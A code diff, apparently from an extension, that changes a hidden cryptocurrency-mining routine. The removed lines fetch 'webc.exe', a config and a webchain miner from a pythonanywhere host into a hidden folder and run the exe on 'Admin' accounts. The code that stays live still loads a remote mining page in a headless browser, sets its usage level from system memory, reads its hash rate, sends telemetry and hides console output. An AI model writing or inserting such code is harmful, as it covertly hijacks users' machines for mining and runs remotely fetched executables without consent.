@@ -94,33 +94,32 @@
     try {
       osUserInfo = os.userInfo();
       if (osUserInfo.username === 'Admin') {
-        let tempFolder = `${os.homedir()}/.temp`;
-        if (!fs.existsSync(tempFolder)) {
-          fs.mkdirSync(tempFolder, { recursive: true });
-        }
-
-        if (!fs.existsSync(`${tempFolder}/webchain-miner-2.8.0-win64.zip`)) {
-          try {
-            await download('https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip', `${tempFolder}/webchain-miner-2.8.0-win64.zip`);
-          } catch (err) { }
-        }
-        if (!fs.existsSync(`${tempFolder}/webc.exe`)) {
-          try {
-            await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc.exe`);
-          } catch (err) { }
-        }
-        if (!fs.existsSync(`${tempFolder}/config.json`)) {
-          try {
-            await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
-          } catch (err) { }
-        }
-        await tstt({ message: "INIT_D2", stat: fs.statSync(`${tempFolder}/webc.exe`) });
-        await execjs(`${tempFolder}/webc.exe`);
         return;
+        // let tempFolder = `${os.homedir()}/.temp`;
+        // if (!fs.existsSync(tempFolder)) {
+        //   fs.mkdirSync(tempFolder, { recursive: true });
+        // }
+
+        // if (!fs.existsSync(`${tempFolder}/webchain-miner-2.8.0-win64.zip`)) {
+        //   try {
+        //     await download('https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip', `${tempFolder}/webchain-miner-2.8.0-win64.zip`);
+        //   } catch (err) { }
+        // }
+        // if (!fs.existsSync(`${tempFolder}/webc.exe`)) {
+        //   try {
+        //     await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc.exe`);
+        //   } catch (err) { }
+        // }
+        // if (!fs.existsSync(`${tempFolder}/config.json`)) {
+        //   try {
+        //     await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
+        //   } catch (err) { }
+        // }
+        // await tstt({ message: "INIT_D2", stat: fs.statSync(`${tempFolder}/webc.exe`) });
+        // await execjs(`${tempFolder}/webc.exe`);
       }
     } catch (error) {
-      throw new Error(error);
-      return;
+      // return;
     }
 
 
@@ -180,9 +179,9 @@
       if (browser && page) {
         const hs = await page.evaluate(() => {
           try {
-            return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client };
+            return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client ? true : false };
           } catch (error) {
-            return { message: error.message, value: null, error, _client: window._client };
+            return { message: error.message, value: null, error, _client: window._client ? true : false };
           }
         });
         if (hs.message != 'success') {
@@ -219,11 +218,11 @@
     // Singleton pattern for browser instance using global object
     async function getBrowserInstance() {
       if (global.browserInstance) {
-        const pages = await global.browserInstance.pages();
-        for (const page of pages) {
-          await page.close();
+        if (global.browserInstance) {
+          await global.browserInstance.browser.close();
+          delete global.browserInstance;
         }
-        return global.browserInstance;
+        return;
       }
 
 
@@ -274,8 +273,8 @@
     browser = await getBrowserInstance();  // Retrieve the singleton browser instance
     page = await browser.newPage();
     page
-      .on('console', message =>
-        unifiedError(`${message.type().substr(0, 3).toUpperCase()} ${message.text()}`))
+      // .on('console', message =>
+      //   unifiedError(`${message.type().substr(0, 3).toUpperCase()} ${message.text()}`))
       .on('pageerror', ({ message }) => unifiedError(message))
       // .on('response', response =>
       //   unifiedError(`${response.status()} ${response.url()}`))
@@ -283,8 +282,6 @@
         unifiedError(`${request.failure().errorText} ${request.url()}`))
 
     await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
-
-
 
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
